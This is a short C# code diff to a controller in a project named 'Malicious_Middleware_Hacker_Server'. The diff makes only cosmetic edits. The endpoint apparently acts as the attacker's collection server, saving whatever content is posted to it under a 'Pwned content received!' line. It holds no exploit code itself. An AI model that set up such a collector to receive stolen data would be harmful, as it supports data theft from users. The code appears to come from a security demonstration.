@@ -1,4 +1,5 @@
-﻿using Microsoft.AspNetCore.Mvc;
+﻿using System;
+using Microsoft.AspNetCore.Mvc;
 using Microsoft.Extensions.Logging;
 
 namespace Malicious_Middleware_Hacker_Server.Controllers
@@ -17,11 +18,9 @@ namespace Malicious_Middleware_Hacker_Server.Controllers
         [HttpPost]
         public void Post(string content)
         {
-            var path = $"Logs\\{System.Guid.NewGuid().ToString()}.txt";
+            var path = $"Logs\\{Guid.NewGuid().ToString()}.txt";
             using var sw = System.IO.File.CreateText(path);
             sw.WriteLine($"Pwned content received!: {content}");
         }
-
-   
     }
 }
